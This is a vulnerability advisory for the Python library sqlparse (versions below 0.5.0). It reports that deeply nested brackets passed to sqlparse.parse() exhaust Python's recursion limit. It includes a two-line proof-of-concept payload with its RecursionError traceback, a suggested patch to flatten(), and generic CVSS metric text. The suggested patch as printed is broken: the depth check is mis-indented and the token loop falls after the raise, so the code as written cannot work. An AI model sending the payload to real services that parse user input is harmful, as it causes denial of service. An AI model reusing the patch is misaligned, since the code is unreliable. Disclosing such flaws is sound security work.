## Package

pip

sqlparse
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 0.5.0

## Patched versions

0.5.0

## Description

### Summary

Passing a heavily nested list to sqlparse.parse() leads to a Denial of Service due to RecursionError.

### Details + PoC

Running the following code will raise Maximum recursion limit exceeded exception:

```
import sqlparse
sqlparse.parse('[' * 10000 + ']' * 10000)
```

We expect a traceback of RecursionError:

```
Traceback (most recent call last):
  File "trigger_sqlparse_nested_list.py", line 3, in <module>
    sqlparse.parse('[' * 10000 + ']' * 10000)
  File "/home/uriya/.local/lib/python3.10/site-packages/sqlparse/__init__.py", line 30, in parse
    return tuple(parsestream(sql, encoding))
  File "/home/uriya/.local/lib/python3.10/site-packages/sqlparse/engine/filter_stack.py", line 36, in run
    stmt = grouping.group(stmt)

  File "/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py", line 328, in group_tokens
    grp = grp_cls(subtokens)
  File "/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py", line 161, in __init__
    super().__init__(None, str(self))
  File "/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py", line 165, in __str__
    return ''.join(token.value for token in self.flatten())
  File "/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py", line 165, in <genexpr>
    return ''.join(token.value for token in self.flatten())
  File "/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py", line 214, in flatten
    yield from token.flatten()
  File "/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py", line 214, in flatten
    yield from token.flatten()
  File "/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py", line 214, in flatten
    yield from token.flatten()
  [Previous line repeated 983 more times]
RecursionError: maximum recursion depth exceeded
```
### Fix suggestion

The [flatten()](https://github.com/andialbrecht/sqlparse/blob/master/sqlparse/sql.py#L207) function of TokenList class should limit the recursion to a maximal depth:

```
from sqlparse.exceptions import SQLParseError

MAX_DEPTH = 100

    def flatten(self, depth=1):
        """Generator yielding ungrouped tokens.

        This method is recursively called for all child tokens.
        """
    if depth >= MAX_DEPTH:
        raise SQLParseError('Maximal depth reached')
        for token in self.tokens:
            if token.is_group:
                yield from token.flatten(depth + 1)
            else:
                yield token
```
### Impact

Denial of Service (the impact depends on the use).

Anyone parsing a user input with sqlparse.parse() is affected.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
